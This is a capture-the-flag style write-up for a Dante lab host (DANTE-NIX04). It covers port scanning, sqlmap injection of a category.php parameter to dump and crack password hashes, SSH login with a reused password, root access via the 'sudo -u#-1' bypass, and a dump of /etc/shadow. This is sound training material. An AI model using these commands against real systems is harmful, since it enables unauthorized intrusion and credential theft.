# 172.16.1.12 - DANTE-NIX04 Pwn3d!

sudo nmap -sV -sC 172.16.1.12

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-28 23:41 CDT

Nmap scan report for 172.16.1.12

Host is up (0.028s latency).

Not shown: 995 closed tcp ports (reset)

PORT STATE SERVICE VERSION

21/tcp open ftp

| fingerprint-strings:

| GenericLines:

| 220 ProFTPD Server (ProFTPD) [::ffff:172.16.1.12]

| Invalid command: try being more creative

| Invalid command: try being more creative

| NULL:

|_ 220 ProFTPD Server (ProFTPD) [::ffff:172.16.1.12]

22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

| 2048 22:cc:a3:e8:7d:d5:65:6d:9d:ea:17:d1:d9:1b:32:cb (RSA)

| 256 04:fb:b6:1a:db:95:46:b7:22:13:61:24:76:80:1e:b8 (ECDSA)

|_ 256 ae:c4:55:67:6e:be:ba:65:54:a3:c3:fc:08:29:24:0e (ED25519)

80/tcp open http Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)

|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3

| http-title: Welcome to XAMPP

|_Requested resource was http://172.16.1.12/dashboard/

443/tcp open ssl/http Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)

| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE

| Not valid before: 2004-10-01T09:10:30

|_Not valid after: 2010-09-30T09:10:30

| tls-alpn:

|_ http/1.1

| http-title: Welcome to XAMPP

|_Requested resource was https://172.16.1.12/dashboard/

|_ssl-date: TLS randomness does not represent time

|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3

3306/tcp open mysql?

| fingerprint-strings:

| DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:

|_ Host ‘172.16.1.100’ is not allowed to connect to this MariaDB server

2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :

==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============

SF-Port21-TCP:V=7.94SVN%I=7%D=3/28%Time=69C8AD94%P=x86_64-pc-linux-gnu%r(N

SF:ULL,33,“220\x20ProFTPD\x20Server\x20\(ProFTPD\)\x20\[::ffff:172\.16\.1\

SF:.12\]\r\n”)%r(GenericLines,8F,“220\x20ProFTPD\x20Server\x20\(ProFTPD\)\

SF:x20\[::ffff:172\.16\.1\.12\]\r\n500\x20Invalid\x20command:\x20try\x20be

SF:ing\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x

SF:20more\x20creative\r\n”);]

gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.16.1.12/ -t 200

![](172%2016%201%2012%20-%20DANTE-NIX04%20Pwn3d%21/imported-image-yKoB.png)

![](172%2016%201%2012%20-%20DANTE-NIX04%20Pwn3d%21/imported-image-NK.png)

We register for an account and sign in

![](172%2016%201%2012%20-%20DANTE-NIX04%20Pwn3d%21/imported-image-hmU.png)

After surfing the site we find a page called category.php

The parameter id is being used. We can try to fuzz the id and see what we get

![](172%2016%201%2012%20-%20DANTE-NIX04%20Pwn3d%21/imported-image-pttT.png)

![](172%2016%201%2012%20-%20DANTE-NIX04%20Pwn3d%21/imported-image-ofsR.png)

Only ids 1-6 give a unique response

Notice that there are only 6 categories total

There is a sql server running on port 3306. Lets try to sql inject into the parameter using sqlmap

We intercept the request with burpsuite and replace the parameter value with * to let sqlmap know where we want to inject. We save the custom request to a file called req.txt

sqlmap -r req.txt --batch

![](172%2016%201%2012%20-%20DANTE-NIX04%20Pwn3d%21/imported-image-TTqd.png)

The parameter is injectable! Let’s dump the database starting with using the –-dbs flag

![](172%2016%201%2012%20-%20DANTE-NIX04%20Pwn3d%21/imported-image-oU.png)

![](172%2016%201%2012%20-%20DANTE-NIX04%20Pwn3d%21/imported-image-eAYV.png)

![](172%2016%201%2012%20-%20DANTE-NIX04%20Pwn3d%21/imported-image-iupo.png)

sqlmap -r req.txt --batch -D blog_admin_db -T membership_users --dump

![](172%2016%201%2012%20-%20DANTE-NIX04%20Pwn3d%21/imported-image-m.png)

Retrieved 3 md5 hashes for users of the blog site. Let’s crack ’em

Saved hashes to a file called md5

hashcat -m 0 md5 rockyou.txt

21232f297a57a5a743894a0e4a801fc3:admin

442179ad1de9c25593cabf625c0badb7:Welcometomyblog

Cracked 2 of 3 hashes

Lets log in with our new creds

![](172%2016%201%2012%20-%20DANTE-NIX04%20Pwn3d%21/imported-image-xd.png)

The admin panel had nothing interesting

Let’s try to ssh into the box with ben’s password

ssh ben@172.16.1.12

![](172%2016%201%2012%20-%20DANTE-NIX04%20Pwn3d%21/imported-image-FVfG.png)

We run [linpeas](http://linpeas.sh/) to see what we can find

We run sudo -l and it seems as if ben is root on the box. However, when we try to change to the root user, we are not allowed

![](172%2016%201%2012%20-%20DANTE-NIX04%20Pwn3d%21/imported-image-gXn.png)

sudo -u#-1 /bin/bash
root@DANTE-NIX04:/home/ben# id
uid=0(root) gid=1000(ben) groups=1000(ben)

root@DANTE-NIX04:/home/ben# cd /root
root@DANTE-NIX04:/root# ls
flag.txt  snap
root@DANTE-NIX04:/root# cat flag.txt
DANTE{sudo_M4k3_me_@_Sandwich}

root@DANTE-NIX04:/home/ben# cat /etc/shadow
root:$6$mGvSK3Q2$o59ZSjkbMcR6ZXfsb12TV/WUZw7buRIRep5up5YsbZB8w7b1XRa9L/Y.OQoEHxZ5O4aIMzWl6bYeRyUYw3wgW.:18458:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
avahi-autoipd:*:18295:0:99999:7:::
usbmux:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
rtkit:*:18295:0:99999:7:::
cups-pk-helper:*:18295:0:99999:7:::
speech-dispatcher:!:18295:0:99999:7:::
whoopsie:*:18295:0:99999:7:::
kernoops:*:18295:0:99999:7:::
saned:*:18295:0:99999:7:::
pulse:*:18295:0:99999:7:::
avahi:*:18295:0:99999:7:::
colord:*:18295:0:99999:7:::
hplip:*:18295:0:99999:7:::
geoclue:*:18295:0:99999:7:::
gnome-initial-setup:*:18295:0:99999:7:::
gdm:*:18295:0:99999:7:::
ben:$6$uKjV5Ai5$bba9k12/tuqQ45jnVwRyZyg/W3dJlr/T2N05XhZq1dZ4EpAaTKh.O3nQVCRWJrxetME8Il3WbrzmWGsoPf2iE.:18470:0:99999:7:::
mysql:!:18439::::::
julian:$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:18439:0:99999:7:::
sshd:*:18471:0:99999:7:::

No pivot